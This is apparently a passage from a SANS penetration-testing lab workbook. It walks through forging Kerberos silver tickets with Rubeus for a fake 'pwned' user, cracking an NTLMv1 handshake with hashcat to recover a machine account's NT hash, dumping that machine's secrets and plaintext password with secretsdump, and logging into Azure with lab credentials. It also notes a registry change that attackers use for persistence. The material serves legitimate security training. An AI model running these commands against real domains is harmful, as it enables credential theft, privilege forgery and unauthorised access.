Did you get an error saying Get-ChildItem: Cannot find path '\\file01.hiboxy.com\c\$' because it does not exist. ?

The most likely issue here is an incorrect time on your Windows VM, as tickets are time-sensitive. Please double-check your Windows VM's clock, as if it's out of sync with the domain controller's clock the resulting ticket may not work. Change the Windows VM's time to match the current time in the Pacific time zone (using https://time.is/PT or similar) before running klist /purge and re-running the Rubeus command to create a new ticket. Then proceed with your dir command again.

You successfully connected to the remote host using the Kerberos ticket for bgreen, but as an administrator!

#### *4: A Second Forged Ticket*

Let's create a new ticket, but let's modify it even more!

With the previous ticket, we gave administrative permissions to bgreen ( Domain Admins, Enterprise Admins , and more). We're now going to fake the username and the RID!

First, we need to delete the tickets from memory.

klist purge

# Expected Results

PS C:\Users\sec560> klist purge

Current LogonId is 0:0x1428ce6 Deleting all tickets: Ticket(s) purged!

Press the up arrow a few times until you get back to your Rubeus command. We're going to modify the /user and provide a bogus /id of 777.

Instead of retyping the previous command, press the up arrow to get to the previously used Rubeus.exe silver command and replace /user:bgreen with /user:pwned /id:777 .

In the following command you need to replace REDACTED\_AES256\_HASH and S-1-5-21-XXXXXXXXXX-YYYYYYYYYY-ZZZZZZZZZZ with different values

Replace REDACTED\_AES256\_HASH with the AES256 hash from secretsdump.py. In our example it is 48f4ee39650c3af0ac304c3961b01cf4e38f3a6f70bb48cdc407f91a979a353b , but yours will be different.

Replace S-1-5-21-XXXXXXXXXX-YYYYYYYYYY-ZZZZZZZZZZ with the SID from lookupsid.py. In our example it is S-1-5-21-3338620771-1880071138-2935716604, but yours will be different.

Rubeus.exe silver /service:cifs/file01.hiboxy.com /aes256:REDACTED\_AES256\_HASH /sid:S-1-5-21-XXXXXXXXXX-YYYYYYYYYY-ZZZZZZZZZZ /ptt /user:pwned /id:777

# Expected Results PS C:\Users\sec560> Rubeus.exe silver /service:cifs/file01.hiboxy.com / aes256:48f4ee39650c3af0ac304c3961b01cf4e38f3a6f70bb48cdc407f91a979a353b / sid:S-1-5-21-3338620771-1880071138-2935716604 /ptt /user:pwned /id:777 \_\_\_\_\_\_ \_ (\_\_\_\_\_ \ | | \_\_\_\_\_) )\_ \_| |\_\_ \_\_\_\_\_ \_ \_ \_\_\_ | \_\_ /| | | | \_ \| \_\_\_ | | | |/\_\_\_) | | \ \| |\_| | |\_) ) \_\_\_\_| |\_| |\_\_\_ | |\_| |\_|\_\_\_\_/|\_\_\_\_/|\_\_\_\_\_)\_\_\_\_/(\_\_\_/ v2.3.3 [\*] Action: Build TGS [\*] Building PAC [\*] Domain : HIBOXY.COM (HIBOXY) [\*] SID : S-1-5-21-3338620771-1880071138-2935716604 [\*] UserId : 777 [\*] Groups : 520,512,513,519,518 [\*] ServiceKey : 48F4EE39650C3AF0AC304C3961B01CF4E38F3A6F70BB48CDC407F91A979A353B [\*] ServiceKeyType : KERB\_CHECKSUM\_HMAC\_SHA1\_96\_AES256 [\*] KDCKey : 48F4EE39650C3AF0AC304C3961B01CF4E38F3A6F70BB48CDC407F91A979A353B [\*] KDCKeyType : KERB\_CHECKSUM\_HMAC\_SHA1\_96\_AES256 [\*] Service : cifs [\*] Target : file01.hiboxy.com ...trimmed for brevity... [\*] Forged a TGS for 'pwned' to 'cifs/file01.hiboxy.com' ...trimmed for brevity... [\*] base64(ticket.kirbi): doIFCTCCBQWgAwIBBaEDAgEWooIEDzCCBAthggQHMIIEA6ADAgEFoQwbCkhJQk9YWS5DT02iJDAioAMC AQKhGzAZGwRjaWZzGxFmaWxlMDEuaGlib3h5LmNvbaOCA8YwggPCoAMCARehAwIBA6KCA7QEggOwQprX ...trimmed for brevity... NTdaphEYDzIwMjIwMTA3MTE0MDU3WqcRGA8yMDIyMDExNDAxNDA1N1qoDBsKSElCT1hZLkNPTakkMCKg AwIBAqEbMBkbBGNpZnMbEWZpbGUwMS5oaWJveHkuY29t

Notice the new ticket name!

[+] Ticket successfully imported!

Let's see if this one works.

dir \\file01.hiboxy.com\c\$

# Expected Results

PS C:\Users\sec560> dir \\file01.hiboxy.com\c\$

Directory: \\file01.hiboxy.com\c\$

| Mode | LastWriteTime        | Length Name           |
|------|----------------------|-----------------------|
|      |                      | <br>                  |
| d    | 8/18/2021 11:24 PM   | EFI                   |
| d    | 9/25/2024<br>8:45 AM | FileShare             |
| d    | 5/8/2021<br>1:20 AM  | PerfLogs              |
| d    | 9/25/2024<br>8:46 AM | Profiles              |
| d-r  | 9/25/2024<br>8:36 AM | ProgramFiles          |
| d    | 7/11/2023<br>7:40 PM | ProgramFiles<br>(x86) |
| d-r  | 9/25/2024<br>8:44 AM | Users                 |
| d    | 9/26/2024<br>7:38 AM | Windows               |

#### It worked!

The "serviceclass" is the part of the ticket before the FQDN (fully qualified domain name) of file01.hiboxy.com. In the previous example, we use the serviceclass cifs . Each service class allows us to connect to a different service. Let's create one for a different serviceclass that allows us to query the remote system's event log. Use the same information in this ticket, but replace cifs with host .

In the following command you need to replace REDACTED\_AES256\_HASH and S-1-5-21-XXXXXXXXXX-YYYYYYYYYY-ZZZZZZZZZZ with different values

Replace REDACTED\_AES256\_HASH with the AES256 hash from secretsdump.py. In our example it is 48f4ee39650c3af0ac304c3961b01cf4e38f3a6f70bb48cdc407f91a979a353b , but yours will be different.

Replace S-1-5-21-XXXXXXXXXX-YYYYYYYYYY-ZZZZZZZZZZ with the SID from lookupsid.py. In our example it is S-1-5-21-3338620771-1880071138-2935716604, but yours will be different.

Rubeus.exe silver /service:host/file01.hiboxy.com /aes256:REDACTED\_AES256\_HASH /sid:S-1-5-21-XXXXXXXXXX-YYYYYYYYYY-ZZZZZZZZZZ /ptt /user:pwned /id:777

# Expected Results

PS C:\Users\sec560> Rubeus.exesilver /service:host/file01.hiboxy.com /aes256: 48f4ee39650c3af0ac304c3961b01cf4e38f3a6f70bb48cdc407f91a979a353b / sid:S-1-5-21-3338620771-1880071138-2935716604/ptt /user:pwned /id:777

...truncated for brevity...

 [\*] Service : host

[\*] Target : file01.hiboxy.com

> ...truncated for brevity...

 [\*] Forged a TGSfor 'pwned' to 'host/file01.hiboxy.com'

...truncated for brevity...

You should see the new ticket for the host service. Let's take a look at our tickets to confirm.

klist

# Expected Results

PS C:\Users\sec560> klist

Current LogonId is 0:0x4b66d

CachedTickets: (2)

# #0> Client: pwned @ HIBOXY.COM

Server: host/file01.hiboxy.com @ HIBOXY.COM

KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96 Ticket Flags 0x40a00000-> forwardable renewablepre\_authent

Start Time: 10/2/2024 18:12:12 (local) End Time: 10/3/2024 4:12:12 (local) RenewTime: 10/9/2024 18:12:12 (local)

Session Key Type: AES-256-CTS-HMAC-SHA1-96

CacheFlags: 0 KdcCalled:

# #1> Client: pwned @ HIBOXY.COM

Server: cifs/file01.hiboxy.com @ HIBOXY.COM

KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96 Ticket Flags 0x40a00000-> forwardable renewablepre\_authent

Start Time: 10/2/2024 18:11:44 (local) End Time: 10/3/2024 4:11:44 (local) RenewTime: 10/9/2024 18:11:44 (local)

Session Key Type: AES-256-CTS-HMAC-SHA1-96

CacheFlags: 0 KdcCalled:

You should see tickets for both host/file01.hiboxy.com and cifs/file01.hiboxy.com .

We already confirmed we access the host via SMB/CIFS, let's take a look at the event log to see what it looks like when we access the system.

wevtutil /r:file01.hiboxy.com qe Security "/q:\*[System/EventID=4624] and \*[EventData/Data[@Name='TargetUserName']='pwned']" /f:text /c:1

# **Expected Results**

PS C:\Users\sec560> wevtutil /r:file01.hiboxy.com qe Security "/q:\*[System/EventID=4624] and \*[EventData|Data|@Name='TargetUserName']='pwned']f:text /c:1

Event[0]

Log Name:Security

**Source: Microsoft-Windows-Security-Auditing** 

Date: 2024-10-02T18:11:50.0550000Z

Event ID: 4624 Task: Logon

**Level: Information** 

Opcode:Info

**Keyword: Audit Success,** 

User: N/A
User Name:N/A

Computer: file01.hiboxy.com

**Description:** 

An account was successfully logged on.

Subject:

Security ID: S-1-0-0
AccountName: AccountDomain: LogonID: 0x0

Logon Information:

LogonType: 3
Restricted AdminMode: -

Virtual Account: No

Elevated Token: Yes

Impersonation Level: Impersonation

**NewLogon:** 

Security ID: S-1-5-21-2197199208-460179848-4251762669-777

Account Name: pwned

AccountDomain: HIBOXY.COM

...truncated for brevity...

#### Were there no results?

If you did not see any results, wait a minute and try again. The event log may take a little while to update.

Look at the RID portion of the SID, it is our fake ID of 777. The "Account Name" is our fake user pwned!

Think about how powerful this is for persistence. We don't need the username or password for a user, and we can pretend to be any user, even a fake account! However, the computer account hashes typically rotate every month. Malicious attackers have disabled this rotation by changing the following registry key to a 1 :

HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange

We can't do similar things with the Golden Ticket attack. Due to a patch on domain controllers, you can't use fake account names anymore since the DC checks the ID and name to make sure they exist and match.

# Conclusion

In this lab, we have created a silver ticket for the CIFS service on FILE01, using the FILE01\$ machine account hash. The silver ticket only gives access to the target service that is specified and for which we have compromised the hash or password. In this case, the CIFS service could be used to obtain sneaky persistence. In case you have time left, feel free to experiment accomplishing persistence in practice or experimenting with Silver and Golden tickets and the access they provide.

# *CTF Prep*

# Lab Access

This SANS course includes a virtual lab environment. There are two ways that you may access your environment.

Note: You will use the B target environment!

# *Option 1: Within your Account Dashboard, select the My Labs link:*

![](SEC560_WorkBook2_page_181_Figure_5.jpeg)

*Option 2: While logged into your SANS account, please visit: https://connect.labs.sans.org .*

#### *Help*

•

If you encounter problems, please speak to your instructor or email virtual-labs-support@sans.org .

# CTF Competition

# *Connectivity*

You must be connected to the CTF target range. This is different than the range used in the earlier portions of the course. See Lab Access above for details on how to connect to the CTF network.

#### *Scope*

Lucadon Financial has purchased Halicron Bank. Lucadon wants a pen test of both environments.

#### *Networks*

The in-scope networks are:

- 10.130.9.0/24 start here •
- 10.130.10.0/24 •
- 10.130.11.0/24 •
- 10.130.12.0/24 •
- 10.130.13.0/24 •
- O365 (halicronbank.com) You can login, but no other attacks! •

You may or may not find hosts in all these networks!

#### *Hint*

The first targets are in the 10.130.9.0/24 network. To save time on the initial steps, we have provided an Nmap scan of the "9" network. The files below were generated using the command: sudo nmap -oA initial -sV 10.130.9.0/24

- initial.nmap •
- initial.gnmap •
- initial.xml •

Note: You do not need to run the command above, but you can if you like. Be aware that it can take five minutes or more to complete.

We *highly* recommend focusing on the 9 network first, and then follow the paths you find.

#### *Background*

Lucadon is a financial services company. Your goal is to demonstrate access to the internal network by identifying vulnerabilities, exploiting those vulnerabilities, and pivoting through the network.

The Lucadon team has left flags on their network that you can access to demonstrate that you can gain access to a system. Flags are in the format of SEC560{SomeUniqueText} , where the text in the curly braces {} is unique per flag. For example, you may find SEC560{FirstFlag} or SEC560{S3c9ndF1@6}.

### *ROE*

The rules of engagement are:

- Do not intentionally break any systems. •
- Do not go out of scope. •
- Do not attack other players. •
- Do not patch systems. •
- Do not change any flags, passwords, or other assets. •

- Do not perform machine-in-the-middle attacks. •
- You CAN create new accounts. •
- If in doubt, ask your instructor. •

Violation of these rules can mean disqualification from the CTF or removal from the course. All such decisions are the sole decision of the instructor or TA.

This is a learning opportunity; however, this is also a light competition. The first team to complete all the objectives, or the team with the lead at the end of the allotted time, will be the winner. If there is a score tie, the winner is the team to reach that highest score first.

# *CTF Engine Access*

- Go to https://www.ranges.io . •
- Click *Sign up* and fill in the form (unless you have an existing account, in which case, use that and skip ahead) •
  - Enter your real name this will not show up on the scoreboard •
  - A valid email address you will need to validate this account •
  - Pick a password you will need this to login, so keep track of it •

| □ SANS TOMAHAWQUE                                                                                                  |                 |  |  |  |  |  |
|--------------------------------------------------------------------------------------------------------------------|-----------------|--|--|--|--|--|
| Sign up                                                                                                            |                 |  |  |  |  |  |
| Real name 91 Tim Medin                                                                                             |                 |  |  |  |  |  |
| Email 112 tim@redsiege.com                                                                                         |                 |  |  |  |  |  |
| Create a password                                                                                                  |                 |  |  |  |  |  |
| Passwords need to meet the strength criteria. We recommend using a password manager to generate a secure password. |                 |  |  |  |  |  |
| Sign up                                                                                                            |                 |  |  |  |  |  |
| Have an account already?                                                                                           |                 |  |  |  |  |  |
| Powered by SANS RCS                                                                                                | Privacy - Terms |  |  |  |  |  |

- You will then be prompted to check your email and open the link to confirm your email address •
- Once you open the link in the email, you will be asked to select your *Display name*; this is the name that shows up on the scoreboard. You can select anything you like, but please keep it appropriate. Note, you cannot change your display name after you select it! •

![](SEC560_WorkBook2_page_185_Figure_0.jpeg)

• Once you have selected your display name, click the *your events page* link.

![](SEC560_WorkBook2_page_186_Picture_0.jpeg)

You are now prompted for an *Event Code*. Your instructor will provide you with a two word code, such as "excellent-tacos" (this is not a valid event code). •

![](SEC560_WorkBook2_page_187_Figure_0.jpeg)

If the event name looks correct, then click "Join event". •

# *Teams*

If you are playing via OnDemand, you will be playing solo, but you can work with others if you like.

first person to sign in should create a team.

#### ONCE YOU JOIN A TEAM, YOU CANNOT MOVE TO ANOTHER TEAM

One person on your team should create the team. The rest of the team members will then join that team.

![](SEC560_WorkBook2_page_188_Figure_0.jpeg)

#### *Creating a team*

Note: Only one person on your team should complete this step.

First, select a creative and fun team name.

![](SEC560_WorkBook2_page_189_Figure_0.jpeg)

You will be given a three word code. This code allows other players to join your team. Share this code with your team members. The code is in the format of "sushi-player-status" (Note, this is not a valid team code).

![](SEC560_WorkBook2_page_190_Figure_0.jpeg)

Get the "Team Code" from the person who created the team.

![](SEC560_WorkBook2_page_191_Figure_0.jpeg)

# *Almost ready!*

Wait for the instructor to tell you to begin!

Good luck, have fun, and happy hacking!

# *Go time!*

When your instructor begins the game, read the introduction carefully!

Also, make sure you read the questions carefully too!

Note: Hints incur a penalty, so please talk with your teammates before taking a hint!

Good luck!

![](SEC560_WorkBook2_page_192_Figure_0.jpeg)

# *Bonus Lab: Cracking a NTLMv1 Handshake to an NT hash*

# No VPN Required

This exercise can be completed locally without an OpenVPN connection.

# Objectives

- To understand the NTLMv1 protocol, how it uses DES encryption, and how to capture NTLMv1 connections •
- To use DES cracking techniques to retrieve the original NT hash from a captured NTLMv1 handshake •

# Lab Setup

VM used:

Linux •

In this lab, we will walk through the process of cracking DES from a captured NTLMv1 handshake to retrieve the original NT hash, *regardless* of the complexity of the password itself.

Normally, when discussing cracking NTLMv1 (or NTLMv2) hashes, the cracking tool is fundamentally guessing passwords, creating the NT hash for them, then walking through the captured server-issued challenge before comparing the captured client response. Instead, since NTLMv1 uses DES encryption with 56-bit keys, by cracking the DES-encrypted client response we can derive the original client NT hash, which we can then pass using Pass-the-Hash techniques.

Normally, this is a fairly involved procedure, since cracking DES involves approximately 72 quadrillion DES operations (2^56). Surprisingly, with today's GPU cracking speeds (a single RTX 4090 can compute approximately 146 billion hashes per second ), with available cloud resources such as Vast.AI, this means it costs on average around \$30 USD to crack the NT hash out of a captured NTLMv1 connection.

For the purposes of this lab, the author has provided you with the first few characters of the DES key, so that it's faster to crack with CPU-based password cracking in a reasonable timeframe.

# Lab – Step-by-Step Instructions

#### *1: Capture NTLMv1 Handshake*

To allow an outbound NTLMv1 connection, LmCompatibilityLevel must be set to 2 or below, which is not default for any supported versions of Windows. However, in some environments that maintain compatibility with older operating systems (or non-Windows SMB clients), it's possible for some servers to be configured to allow NTLMv1 connections.

In those environments, any method of coercing authentication (tricking the remote machine into connecting to an attackercontrolled machine) can result in compromise of the account used for authentication. For many network connections, Windows computers will use their domain computer account. For example, in this lab the file01 computer was the target of Coercer

authenticated as a limited user, which was enough to cause the file01 to connect to the author's VM using its domain computer account ( FILE01\$). The author's VM was running Responder to capture the NTLMv1 handshake, which does require the --lm option.

Check the Responder logs for captured NTLMv1 handshakes:

# Command

cat ~sec560/labs/ntlmv1-capture.txt

# Expected Results

sec560@560vm:~\$ cat ~sec560/labs/ntlmv1-capture.txt

FILE01\$::HIBOXY:

29F6C0D455D0C29851D5E8217DF9CDFD88FCC6ED4E84C0E9:29F6C0D455D0C29851D5E8217DF9CDFD88FCC6ED4E84C0E9:ea1ebed2adc2

While this output is provided for you, this is the same format that Responder uses. The original file name and path would be something like /pentest/exploitation/responder/logs/SMB-NTLMv1-10.130.10.44.txt .

#### *2: Extract Information from the Handshake*

Next, we'll extract the relevant parts of the captured NTLMv1 handshake using ntlmv1.py from ntlmv1-multi, a repository from EvilMog:

#### Command

ntlmv1.py

# Expected Results

sec560@560vm:~\$ ntlmv1.py

usage: ntlmv1.py [-h] --ntlmv1 NTLMV1 [--hashcat HASHCAT] [--hcutils HCUTILS] [--json] [- ct3]

ntlmv1.py: error: the following arguments are required: --ntlmv1

The --ntlmv1 option uses the same format as the captured NTLMv1 handshake from Responder, so you can copy and paste the output from the previous step into the --ntlmv1 option:

ntlmv1.py --ntlmv1 'FILE01\$::HIBOXY:

29F6C0D455D0C29851D5E8217DF9CDFD88FCC6ED4E84C0E9:29F6C0D455D0C29851D5E8217DF9CDFD88FCC6ED4E84C0E9:ea1ebed2adc2b0c

# Expected Results

sec560@560vm:~\$ ntlmv1.py --ntlmv1 'FILE01\$::HIBOXY:

29F6C0D455D0C29851D5E8217DF9CDFD88FCC6ED4E84C0E9:29F6C0D455D0C29851D5E8217DF9CDFD88FCC6ED4E84C0E9:ea1ebed2adc2

Hashfield Split:

['FILE01\$', '', 'HIBOXY', '29F6C0D455D0C29851D5E8217DF9CDFD88FCC6ED4E84C0E9', '29F6C0D455D0C29851D5E8217DF9CDFD88FCC6ED4E84C0E9', 'ea1ebed2adc2b0ce']

Hostname: HIBOXY Username: FILE01\$

Challenge: ea1ebed2adc2b0ce

LM Response: 29F6C0D455D0C29851D5E8217DF9CDFD88FCC6ED4E84C0E9 NT Response: 29F6C0D455D0C29851D5E8217DF9CDFD88FCC6ED4E84C0E9

CT1: 29F6C0D455D0C298 CT2: 51D5E8217DF9CDFD CT3: 88FCC6ED4E84C0E9

To Calculate final 4 characters of NTLM hash use: ./ct3\_to\_ntlm.bin 88FCC6ED4E84C0E9 ea1ebed2adc2b0ce

To crack with hashcat create a file with the following contents: 29F6C0D455D0C298:ea1ebed2adc2b0ce 51D5E8217DF9CDFD:ea1ebed2adc2b0ce

echo "29F6C0D455D0C298:ea1ebed2adc2b0ce">>14000.hash echo "51D5E8217DF9CDFD:ea1ebed2adc2b0ce">>14000.hash

To crack with hashcat:

./hashcat -m 14000 -a 3 -1 charsets/DES\_full.charset --hex-charset 14000.hash ?1?1?1?1?1? 1?1?1

The ct3\_to\_ntlm binary is part of Hashcat's additional utilities. Let's start with that:

export third=\$( ct3\_to\_ntlm 88FCC6ED4E84C0E9ea1ebed2adc2b0ce) echo \$third

# Expected Results

sec560@560vm:~\$ export third=\$(ct3\_to\_ntlm 88FCC6ED4E84C0E9ea1ebed2adc2b0ce) sec560@560vm:~\$ echo \$third c701

Next, let's go ahead and set up the hash file for Hashcat:

#### Command

echo "29F6C0D455D0C298:ea1ebed2adc2b0ce" >>14000.hash echo "51D5E8217DF9CDFD:ea1ebed2adc2b0ce" >>14000.hash

#### Expected Results

These commands have no output.

#### *3: Crack DES using Hashcat*

Next, we'll use Hashcat to crack the DES keys from the captured NTLMv1 handshake.

Here, we've provided the first five bytes from each of the encrypted DES challenge parts, by specifying the actual bytes (in hex encoding) instead of the full ?1?1?1?1?1?1?1?1 (eight bytes) that would normally be required.

First, let's crack the first full challenge:

hashcat -m 14000 -a 3 -1 /pentest/password-recovery/hashcat/charsets/DES\_full.hcchr --hex-charset 14000.hash 736bdf04c1?1?1?1

# Expected Results

sec560@560vm:~\$ hashcat -m 14000 -a 3 -1 /pentest/password-recovery/hashcat/charsets/DES\_full.hcchr --hex-charset 14000.hash 736bdf04c1?1?1?1

hashcat (v7.1.2) starting [...trimmed for brevity...]

29f6c0d455d0c298:ea1ebed2adc2b0ce:\$ HEX[ 736bdf04c12fa81f] Approaching final keyspace - workload adjusted.

Session..........: hashcat Status...........: Exhausted [...trimmed for brevity...]

Above, Hashcat cracked the first half of the DES key (bytes 1-8) as 736bdf04c12fa81f.

Next, let's crack the second challenge:

# Command

hashcat -m 14000 -a 3 -1 /pentest/password-recovery/hashcat/charsets/DES\_full.hcchr --hex-charset 14000.hash 6bbf9eec2c?1?1?1

# Expected Results

sec560@560vm:~\$ hashcat -m 14000 -a 3 -1 /pentest/password-recovery/hashcat/charsets/DES\_full.hcchr - hex-charset 14000.hash 6bbf9eec2c?1?1?1

hashcat (v7.1.2) starting

[...trimmed for brevity...] 51d5e8217df9cdfd:ea1ebed2adc2b0ce:\$ HEX[ 6bbf9eec2cbf3897]

Session..........: hashcat Status...........: Cracked [...trimmed for brevity...]

This command should finish in a few moments, providing the last piece we need to reconstruct the original NT hash.

# *4: Extract the DES Keys*

Extract the DES keys from Hashcat's potfile.

#### Command

cat /pentest/password-recovery/hashcat/hashcat.potfile

# Expected Results

29f6c0d455d0c298:ea1ebed2adc2b0ce:\$ HEX[ 736bdf04c12fa81f] 51d5e8217df9cdfd:ea1ebed2adc2b0ce:\$ HEX[ 6bbf9eec2cbf3897]

We've cracked the DES keys from the NTLMv1 operation, but we need to convert these to the NT hash of the FILE01\$ computer account.

# *5: Convert DES Keys to NT Hash Components*

Convert the extracted DES keys to NT hash components using the provided Perl script.

#### Command

deskey\_to\_ntlm deskey\_to\_ntlm 736bdf04c12fa81f deskey\_to\_ntlm 6bbf9eec2cbf3897

#### Expected Results

sec560@560vm:~\$ deskey\_to\_ntlm usage: /usr/local/bin/deskey\_to\_ntlm 8-byte-key-in-hex sec560@560vm:~\$ deskey\_to\_ntlm 736bdf04c12fa81f 72d7782c05ea0f sec560@560vm:~\$ deskey\_to\_ntlm 6bbf9eec2cbf3897 6b7e7f62d7ce4b

Since the NTLMv1 transaction uses three DES operations, we need to combine these three components to get the full NT hash. The first two components are the output of the hashcat commands we did before, whereas the third component was calculated using the ct3\_to\_ntlm binary directly (as it's shorter and easier to calculate).

#### *6: Combine the NTLM Hash Components*

Combine the NTLM hash components and use the final 4 characters from the ct3\_to\_ntlm binary.

# Command

ct3\_to\_ntlm 88FCC6ED4E84C0E9ea1ebed2adc2b0ce

# Expected Results

c701

Next, combine each part of the cracked hash to get the full NT hash:

#### Command

export first= 72d7782c05ea0f# Output from deskey\_to\_ntlm 736bdf04c12fa81f export second=6b7e7f62d7ce4b# Output from deskey\_to\_ntlm 6bbf9eec2cbf3897 export third= c701# Output from ct3\_to\_ntlm 88FCC6ED4E84C0E9 ea1ebed2adc2b0ce echo "NT hash of FILE01\$ is: \$first\$second\$third"

#### Expected Results

sec560@560vm:~\$ export first=72d7782c05ea0f# Output from deskey\_to\_ntlm 736bdf04c12fa81f sec560@560vm:~\$ export second=6b7e7f62d7ce4b# Output from deskey\_to\_ntlm 6bbf9eec2cbf3897 sec560@560vm:~\$ export third=c701# Output from ct3\_to\_ntlm 88FCC6ED4E84C0E9 ea1ebed2adc2b0ce sec560@560vm:~\$ echo "NT hash of FILE01\$ is: \$first\$second\$third" NT hash of FILE01\$ is: 72d7782c05ea0f6b7e7f62d7ce4bc701

#### *7: Verify the NT Hash*

Use Impacket's secretsdump.py to verify the extracted NT hash by dumping the hashes from the captured hive files.

secretsdump.py -security ~sec560/labs/file01.hiboxy.com-SECURITY.hive -sam ~sec560/labs/file01.hiboxy.com-SAM.hive -system ~sec560/labs/file01.hiboxy.com-SYSTEM.hive LOCAL

# Expected Results

sec560@560vm:~\$ secretsdump.py -security ~sec560/labs/file01.hiboxy.com-SECURITY.hive -sam ~sec560/ labs/file01.hiboxy.com-SAM.hive -system ~sec560/labs/file01.hiboxy.com-SYSTEM.hive LOCAL

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

- [\*] Target system bootKey: 0x8b5a73d4c81546f8fd3a94c893dd222a
- [\*] Dumping local SAM hashes (uid:rid:lmhash:nthash)

Administrator:500:aad3b435b51404eeaad3b435b51404ee:44f08ff42ab20d0d60a30a760e8850f4:::

Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:

58f8e0214224aebc2c5f82fb7cb47ca1:::

SROCAdmin:1008:aad3b435b51404eeaad3b435b51404ee:2e920723943f81ec0af0fd735f737fef:::

[\*] Dumping cached domain logon information (domain/username:hash)

HIBOXY.COM/Administrator:\$DCC2\$10240#Administrator# bf75fef06b803e58b87c815d80af2c91:

(2024-08-07 13:28:57 )

- [\*] Dumping LSA Secrets
- [\*] \$ MACHINE.ACC

\$MACHINE.ACC:plain\_password\_hex:

410065003000640047005800570065006e004b007a0079002300630071002a004700500023005d00290041002300340038005d00500028005200550046003

\$MACHINE.ACC:aad3b435b51404eeaad3b435b51404ee:72d7782c05ea0f6b7e7f62d7ce4bc701

[\*] DPAPI\_SYSTEM

dpapi\_machinekey:0x3e4a36f108edebdb5b87327abdb0cd8154fbbc89

dpapi\_userkey:0xa67e9a084c831e64e163dc62ce75a65c0d2163b0

[\*] NL\$KM

0000 8D D2 8E 67 54 58 89 B1 C9 53 B9 5B 46 A2 B3 66 ...gTX...S.[F..f

0010 D4 3B 95 80 92 7D 67 78 B7 1D F9 2D A5 55 B7 A3 .;...}gx...-.U..

0020 61 AA 4D 86 95 85 43 86 E3 12 9E C4 91 CF 9A 5B a.M...C........[

0030 D8 BB 0D AE FA D3 41 E0 D8 66 3D 19 75 A2 D1 B2 ......A..f=.u...

NL\$KM:

8dd28e67545889b1c953b95b46a2b366d43b9580927d6778b71df92da555b7a361aa4d8695854386e3129ec491cf9a5bd8bb0daefad341

[\*] Cleaning up...

You should see the NT hash in the output matching the extracted NT hash: 72d7782c05ea0f6b7e7f62d7ce4bc701 .

In fact, the hex-encoded plain text password of FILE01\$ is also in that output.

Let's decode the password:

```
Command
 echo -n
 410065003000640047005800570065006e004b007a0079002300630071002a004700500023005d00290041002300340038005d005000280052005500460038004
 | xxd -r -p | openssl dgst -md4 -provider legacy 2 >/dev/null
 echo -n "The plain text password for FILE01 is: "; echo -n
 410065003000640047005800570065006e004b007a0079002300630071002a004700500023005d00290041002300340038005d005000280052005500460038004
 | xxd -r -p ; echo
 Expected Results
  sec560@560vm:~$ echo-n
  410065003000640047005800570065006e004b007a0079002300630071002a004700500023005d00290041002300340038005d00500028005200550046003
  | xxd -r -p | openssl dgst -md4 -provider legacy 2 >/dev/null
  MD4(stdin)= 72d7782c05ea0f6b7e7f62d7ce4bc701
  sec560@560vm:~$ echo-n "The plain text password for FILE01 is: "; echo -n
  410065003000640047005800570065006e004b007a0079002300630071002a004700500023005d00290041002300340038005d00500028005200550046003
  | xxd -r -p ; echo
  The plain text password for FILE01 is: 
  Ae0dGXWenKzy#cq*GP#])A#48]P(RUF8GPqa<j;_jF=2RVK(6Vv:41*_1lB i% 
  xl9yY=8p`Nc=V76"UZZEUwKFR70)/c4Tz3"Sf&X;R/z7r]/6a'F.b$6-#
```

Computer accounts are domain accounts. They have associated password hashes, but also actual passwords, which are stored in a retrievable format inside the registry. This is why the password is available in the secretsdump output.

# Conclusion

In this lab, we have walked through the process of capturing NTLMv1 handshakes, extracting the relevant components, and cracking the DES keys to retrieve the original NT hash. This demonstrates the vulnerabilities in NTLMv1 and the importance of using more secure authentication mechanisms.

While captured NTLMv2 handshakes are still bad, they aren't as catastrophically bad as NTLMv1. With today's GPU cracking speeds, NTLMv1 is more and more similar to simply authenticating with the password itself.

# *Bonus Lab: Running Commands via Azure*

# No VPN Required

This exercise does not require an OpenVPN connection. Internet access is required.

# Objectives

- Log in to Azure using the compromised credentials •
- Use the credentials to scan for common Azure miscon figurations •
- Remotely execute commands on a system without having access to the network portion of Azure •

# Lab Setup

VMs used:

Linux •

Let's first clean up the lab so we can ensure we don't have any artifacts from previous runs.

## Command

rm -rf ~/.azure/\*

# Lab – Step-by-Step Instructions

We now have several accounts that we can use to gain access to the Azure Platform. This attack starts using the MITRE ATT&CK® Technique for Forged Web Credentials (T1606). Using this Technique, an attacker can gain access to a site, perhaps privileged access. Let's start by logging into Azure using the CLI tools.

# Lab – Step-by-Step Instructions

#### *1: Logging into Azure*

This lab will use the Linux Virtual Machine. To use *az* tools, open a Linux Terminal prompt and run the following commands.

az

# Expected Results

sec560@560vm:~\$ az

Welcome to Azure CLI!

---------------------

Use `az -h` to see available commands or go to https://aka.ms/cli.

# Telemetry

---------

The Azure CLI collects usage data in order to improve your experience.

The data is anonymous and does not include commandline argument values.

The data is collected by Microsoft.

You can change your telemetry settings with `az configure`.

![](SEC560_WorkBook2_page_203_Picture_13.jpeg)

Welcome to the cool new Azure CLI! [Ended for Brevity]

Here we can see the output of the az command and all of the subcommands which correspond to services in Azure. To use them we first need to login.

#### *2: az login -u*

There are many ways to log in to azure from the CLI. If you type az login , it will use a browser to log in. There are also ways to specify the username and password in the command line, convenient for non-MFA logins. Let's use az login -u to show how this works.

We'll use the credentials: aparker@hiboxy.com/ Oozle11 as follows:

az login -u aparker@hiboxy.com -p Oozle11

#### Expected Results

```
sec560@560vm:~$ az login -u aparker@hiboxy.com -p Oozle11
WARNING: Starting September 1, 2025, MFA will be gradually enforced for Azure public 
cloud. The authentication with username and password in the command line is not supported 
with MFA. Consider using one of the compatible authentication methods. For more details, 
see https://go.microsoft.com/fwlink/?linkid=2276314
[
 {
 "cloudName": "AzureCloud",
 "homeTenantId": "1c0060e4-c4db-4777-a48b-34a1515e33bf",
 "id": "5c32501e-9ce5-4776-bf31-d96f8b71769e",
 "isDefault": true,
 "managedByTenants": [],
 "name": "Hiboxy",
 "state": "Enabled",
 "tenantDefaultDomain": "hiboxy.com",
 "tenantDisplayName": "Hiboxy",
